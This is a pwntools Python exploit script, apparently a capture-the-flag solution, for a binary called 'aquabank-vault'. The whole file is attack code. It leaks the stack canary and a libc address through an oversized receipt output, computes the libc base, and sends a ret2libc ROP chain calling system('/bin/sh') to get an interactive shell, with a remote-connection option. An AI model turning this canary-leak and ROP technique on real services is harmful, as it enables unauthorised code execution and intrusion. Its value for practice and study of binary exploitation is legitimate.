#!/usr/bin/env python3

from pwn import *

exe = ELF("./aquabank-vault_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level="debug"
rop=ROP(libc)
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    p=r 
    p.recvuntil('>')
    p.sendline(b'1')
    p.recv()
    OFFSET_TO_CANARY_OPENVAULT=136
    #---STEP 0 ---
    #Trigger the fwrite to print all the 256 character that include leaking of the stack
    payload=flat(

        b'A'*64
    )
    p.send(payload)
    p.recvuntil('--- RECEIPT ---')
    leak_draft=p.recvuntil('---------------')

    #---STEP 1---
    #Computing of libc_base and canary
    leak_draft=leak_draft[65:]

    leak_canary=u64(leak_draft[8:16],"little")
    canary=leak_canary
    print(leak_draft)
    print("CANARY=", hex(canary))

    leak_libc=u64(leak_draft[0x58:0x60],"little")
    libc_addr=leak_libc
    print(leak_draft[0x58:0x60])

    print("LIBC=", hex(libc_addr))
    LIBC_BASE= libc_addr-0x2a1ca
    print(hex(LIBC_BASE))
    #gdb.attach(p)
    #pause()
    POP_RDI=rop.find_gadget(["pop rdi","ret"])[0] + LIBC_BASE
    BINSH= next(libc.search(b'/bin/sh\x00'))+LIBC_BASE
    SYSTEM = libc.sym["system"] + LIBC_BASE
    RET=rop.find_gadget(["ret"])[0] + LIBC_BASE

    p.sendline(b'2')
    p.recv()
    #---STEP 2---
    # ROP chain that expose a shell
    payload=flat(
        b'A'*OFFSET_TO_CANARY_OPENVAULT,
        p64(canary),
        b'B'*8,
        p64(RET),
        p64(POP_RDI),p64(BINSH),
        p64(SYSTEM)

    )
    p.send(payload)
    



    r.interactive()


if __name__ == "__main__":
    main()
